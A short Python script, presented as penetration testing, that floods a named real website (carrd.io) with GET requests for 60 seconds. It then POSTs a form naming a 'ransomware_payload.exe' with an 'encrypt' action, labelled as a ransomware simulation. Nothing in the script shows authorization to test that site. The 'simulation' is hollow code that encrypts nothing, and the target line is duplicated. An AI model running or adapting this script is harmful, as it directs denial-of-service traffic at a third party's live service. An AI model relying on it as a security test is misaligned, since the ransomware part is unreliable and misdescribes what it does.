# Website Penetration Testing for DOS and Ransomware Vulnerabilities

import requests
import time

def dos_attack(target_url, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            response = requests.get(target_url)
            print(f"Request sent to {target_url}, Response Code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")

def ransomware_simulation(target_url):
    payload = {
        'file': 'ransomware_payload.exe',
        'action': 'encrypt'
    }
    try:
        response = requests.post(target_url, data=payload)
        print(f"Ransomware simulation response: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    target = "http://carrd.io"
    target = "http://carrd.io"
    dos_duration = 60  # Duration in seconds for DOS attack

    print("Starting DOS attack...")
    dos_attack(target, dos_duration)

    print("Simulating Ransomware attack...")
    ransomware_simulation(target)
